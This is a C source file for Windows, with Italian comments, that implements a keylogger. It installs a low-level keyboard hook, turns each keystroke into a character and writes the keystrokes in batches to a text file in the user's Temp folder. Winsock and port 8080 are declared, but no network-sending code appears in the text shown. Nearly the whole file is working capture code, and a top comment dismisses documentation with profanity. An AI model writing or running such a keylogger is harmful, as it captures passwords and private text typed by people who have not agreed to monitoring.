#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

/*
Comment and documentations? Fuck Off... I don't even know how this works and if it will works in the future 
*/

#define PORT 8080
#define BUFFERSIZE 256
#define EOF_MARKER -1 // Segnalatore custom EOF

typedef struct {
    int n;
    int buffer[BUFFERSIZE];
} BingBongBuffer;

HHOOK hHook = NULL;
BingBongBuffer* bingbong = NULL;
FILE* fp = NULL;


char* readFile(const char* path);

char* readFile(const char* path) {
    FILE* fp = fopen(path, "r");
    if (fp == NULL) {
        perror("Errore nell'apertura del file");
        return NULL;
    }

    // Vai alla fine del file per determinare la dimensione
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    rewind(fp); // Torna all'inizio del file

    // Alloca memoria per il contenuto del file (+1 per terminazione stringa)
    char* file_content = (char*)malloc(file_size + 1);
    if (file_content == NULL) {
        perror("Errore allocazione memoria");
        fclose(fp);
        return NULL;
    }

    // Leggi il file e aggiungi il terminatore
    size_t read_size = fread(file_content, 1, file_size, fp);
    file_content[read_size] = '\0';

    fclose(fp);
    return file_content;
}

// Funzione per scrivere buffer e aggiungere EOF
int writeFileDumb(FILE* fp, BingBongBuffer* buffer) {
    if (!fp || !buffer) {
        printf("Errore: file o buffer non validi.\n");
        return -1;
    }

    for (int i = 0; i < buffer->n; i++) {
        fprintf(fp, "%lc", (wchar_t)buffer->buffer[i]); // Scrivi il carattere wide
    }

    fprintf(fp, "\n"); // Segnalatore EOF leggibile
    fflush(fp);

    buffer->n = 0;
    return 0;
}

// Procedura Hook per trasformare vkCode in carattere leggibile
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        BYTE keyboardState[256];
        wchar_t charBuffer[5] = {0}; // Usa wchar_t invece di char per compatibilità con ToUnicode

        // Ottieni lo stato della tastiera corrente
        GetKeyboardState(keyboardState);

        // Converti vkCode in carattere leggibile
        int result = ToUnicode(kbd->vkCode, kbd->scanCode, keyboardState, charBuffer, sizeof(charBuffer)/sizeof(wchar_t), 0);

        if (result > 0) {
            printf("Tasto premuto: %lc\n", charBuffer[0]);
            bingbong->buffer[bingbong->n++] = charBuffer[0];
        } else {
            printf("Tasto premuto: VK_CODE %d\n", kbd->vkCode);
            bingbong->buffer[bingbong->n++] = kbd->vkCode;
        }

        // Scrivi su file se il buffer è pieno
        if (bingbong->n == BUFFERSIZE) {
            writeFileDumb(fp, bingbong);
        }

        // Esci se viene premuto ESC
        if (kbd->vkCode == VK_ESCAPE) {
            PostQuitMessage(0);
        }
    }

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

int loggerBody() {
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "C:\\Users\\%s\\AppData\\Local\\Temp\\a.txt", getenv("USERNAME"));

    fp = fopen(path, "w+");
    if (!fp) {
        printf("Errore nell'apertura del file.\n");
        return -1;
    }

    bingbong = (BingBongBuffer*)malloc(sizeof(BingBongBuffer));
    if (!bingbong) {
        printf("Errore di allocazione memoria.\n");
        fclose(fp);
        return -1;
    }
    bingbong->n = 0;

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) {
        printf("Errore nell'installazione dell'hook.\n");
        free(bingbong);
        fclose(fp);
        return -1;
    }

    printf("Premi ESC per uscire.\n");
 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (bingbong->n > 0) {
        writeFileDumb(fp, bingbong);
    }

    UnhookWindowsHookEx(hHook);
    free(bingbong);
    fclose(fp);
    
    printf("Programma terminato.\n");
    return 0;
}
